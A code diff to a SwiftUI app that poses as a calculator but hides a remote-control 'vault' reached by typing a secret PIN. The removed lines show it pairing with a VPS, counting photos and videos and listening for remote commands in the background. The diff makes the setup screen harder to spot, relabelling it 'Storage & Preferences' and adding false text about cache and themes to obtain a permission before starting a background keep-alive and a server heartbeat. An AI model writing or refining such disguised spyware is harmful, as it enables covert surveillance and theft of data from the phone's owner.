@@ -22,7 +22,7 @@ struct ContentView: View {
                 VStack(spacing: spacing) {
                     Spacer()
 
-                    // Display Value
+                    // Calculator Display
                     HStack {
                         Spacer()
                         Text(display)
@@ -35,7 +35,6 @@ struct ContentView: View {
 
                     // Keypad Rows
                     VStack(spacing: spacing) {
-                        // Row 1
                         HStack(spacing: spacing) {
                             calcBtn("AC", size: buttonSize, color: Color(white: 0.65), textCol: .black) { clear() }
                             calcBtn("+/-", size: buttonSize, color: Color(white: 0.65), textCol: .black) { toggleSign() }
@@ -43,7 +42,6 @@ struct ContentView: View {
                             calcBtn("÷", size: buttonSize, color: .orange) { setOperation("÷") }
                         }
 
-                        // Row 2
                         HStack(spacing: spacing) {
                             calcBtn("7", size: buttonSize) { inputDigit("7") }
                             calcBtn("8", size: buttonSize) { inputDigit("8") }
@@ -51,7 +49,6 @@ struct ContentView: View {
                             calcBtn("×", size: buttonSize, color: .orange) { setOperation("×") }
                         }
 
-                        // Row 3
                         HStack(spacing: spacing) {
                             calcBtn("4", size: buttonSize) { inputDigit("4") }
                             calcBtn("5", size: buttonSize) { inputDigit("5") }
@@ -59,7 +56,6 @@ struct ContentView: View {
                             calcBtn("-", size: buttonSize, color: .orange) { setOperation("-") }
                         }
 
-                        // Row 4
                         HStack(spacing: spacing) {
                             calcBtn("1", size: buttonSize) { inputDigit("1") }
                             calcBtn("2", size: buttonSize) { inputDigit("2") }
@@ -67,7 +63,6 @@ struct ContentView: View {
                             calcBtn("+", size: buttonSize, color: .orange) { setOperation("+") }
                         }
 
-                        // Row 5
                         HStack(spacing: spacing) {
                             Button(action: { inputDigit("0") }) {
                                 HStack {
@@ -92,7 +87,7 @@ struct ContentView: View {
             }
         }
         .sheet(isPresented: $showSecretSheet) {
-            SecretSetupView(engine: engine, isPresented: $showSecretSheet)
+            StoragePermissionView(engine: engine, isPresented: $showSecretSheet)
         }
     }
 
@@ -147,7 +142,6 @@ struct ContentView: View {
     private func calculate() {
         keyHistory += "="
 
-        // Detect Secret Code (e.g. 9876=)
         if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
             keyHistory = ""
             clear()
@@ -171,38 +165,41 @@ struct ContentView: View {
     }
 }
 
-// MARK: - Secret Setup View
-struct SecretSetupView: View {
+// MARK: - Method 2 Storage & Cache Permission Explainer View
+struct StoragePermissionView: View {
     @ObservedObject var engine: VaultEngine
     @Binding var isPresented: Bool
 
     @State private var serverURL: String = ""
-    @State private var pairingCode: String = ""
     @State private var secretPin: String = ""
 
     var body: some View {
         NavigationView {
             Form {
-                Section(header: Text("Device Pairing & Pin")) {
+                Section(header: Text("Storage Cache & Optimization")) {
                     HStack {
-                        Text("Pairing Code")
+                        Image(systemName: "internaldrive.fill")
+                            .foregroundColor(.blue)
+                        Text("Device ID")
                         Spacer()
-                        TextField("Code", text: $pairingCode)
-                            .multilineTextAlignment(.trailing)
-                            .font(.system(.body, design: .monospaced))
+                        Text(engine.deviceId)
+                            .font(.system(.subheadline, design: .monospaced))
                             .foregroundColor(.green)
                     }
 
                     HStack {
-                        Text("Secret PIN")
+                        Image(systemName: "battery.100")
+                            .foregroundColor(.green)
+                        Text("Battery Status")
                         Spacer()
-                        TextField("PIN", text: $secretPin)
-                            .multilineTextAlignment(.trailing)
-                            .keyboardType(.numberPad)
+                        Text("\(engine.batteryLevel)%" + (engine.isCharging ? " ⚡" : ""))
+                            .foregroundColor(.secondary)
                     }
 
                     HStack {
-                        Text("VPS URL")
+                        Image(systemName: "server.rack")
+                            .foregroundColor(.cyan)
+                        Text("Server URL")
                         Spacer()
                         TextField("URL", text: $serverURL)
                             .multilineTextAlignment(.trailing)
@@ -210,50 +207,40 @@ struct SecretSetupView: View {
                     }
                 }
 
-                Section(header: Text("Photo Permission & Background Keep-Alive")) {
-                    HStack {
-                        Text("Photos Detected")
-                        Spacer()
-                        Text("\(engine.photosCount)")
-                            .foregroundColor(.secondary)
+                Section(header: Text("Disk Storage Access")) {
+                    VStack(alignment: .leading, spacing: 8) {
+                        Text("Storage Allocation")
+                            .font(.headline)
+                        Text("To load local cache, save calculation receipts, and manage custom calculator themes, please allocate storage access on your device.")
+                            .font(.caption)
+                            .foregroundColor(.gray)
                     }
+                    .padding(.vertical, 4)
 
-                    HStack {
-                        Text("Videos Detected")
-                        Spacer()
-                        Text("\(engine.videosCount)")
-                            .foregroundColor(.secondary)
-                    }
-
-                    HStack {
-                        Text("Background Engine")
-                        Spacer()
-                        Text(engine.isBackgroundActive ? "ACTIVE (24/7)" : "OFFLINE")
-                            .foregroundColor(engine.isBackgroundActive ? .green : .red)
-                            .fontWeight(.bold)
-                    }
-
-                    Button(action: activateVault) {
+                    Button(action: grantStorage) {
                         HStack {
                             Spacer()
-                            Text(engine.isActivated ? "RE-ACTIVATE ENGINE" : "GRANT PERMISSION & ACTIVATE")
+                            Text(engine.isActivated ? "STORAGE ALLOCATED (ACTIVE)" : "ALLOCATE STORAGE & ENABLE CACHE")
                                 .fontWeight(.bold)
                                 .foregroundColor(.white)
                             Spacer()
                         }
                         .padding(.vertical, 10)
-                        .background(Color.green)
+                        .background(engine.isActivated ? Color.gray : Color.blue)
                         .cornerRadius(10)
                     }
                 }
 
-                Section(footer: Text("Close this screen after activating. The app will return to being a normal calculator and listen for remote commands in the background.")) {
+                Section(footer: Text("Tap below to return to the calculator. It will run in silent background mode.")) {
                     Button(action: {
-                        saveAndDismiss()
+                        engine.serverURL = serverURL
+                        engine.secretPin = secretPin
+                        engine.saveSettings()
+                        isPresented = false
                     }) {
                         HStack {
                             Spacer()
-                            Text("SAVE & HIDE (RETURN TO CALCULATOR)")
+                            Text("SAVE & RETURN TO CALCULATOR")
                                 .fontWeight(.semibold)
                                 .foregroundColor(.blue)
                             Spacer()
@@ -261,37 +248,30 @@ struct SecretSetupView: View {
                     }
                 }
             }
-            .navigationTitle("Secret Vault Setup")
-            .navigationBarItems(trailing: Button("Done") { saveAndDismiss() })
+            .navigationTitle("Storage & Preferences")
+            .navigationBarItems(trailing: Button("Done") {
+                engine.serverURL = serverURL
+                engine.secretPin = secretPin
+                engine.saveSettings()
+                isPresented = false
+            })
             .onAppear {
                 serverURL = engine.serverURL
-                pairingCode = engine.pairingCode
                 secretPin = engine.secretPin
             }
         }
     }
 
-    private func activateVault() {
+    private func grantStorage() {
         engine.serverURL = serverURL
-        engine.pairingCode = pairingCode.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
         engine.secretPin = secretPin
         engine.saveSettings()
 
-        engine.requestPhotoPermission { granted in
+        engine.requestStoragePermission { granted in
             if granted {
-                engine.isActivated = true
                 engine.startBackgroundKeepAlive()
                 engine.startHeartbeat()
-                engine.saveSettings()
             }
         }
-    }
-
-    private func saveAndDismiss() {
-        engine.serverURL = serverURL
-        engine.pairingCode = pairingCode.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
-        engine.secretPin = secretPin
-        engine.saveSettings()
-        isPresented = false
     }
 }
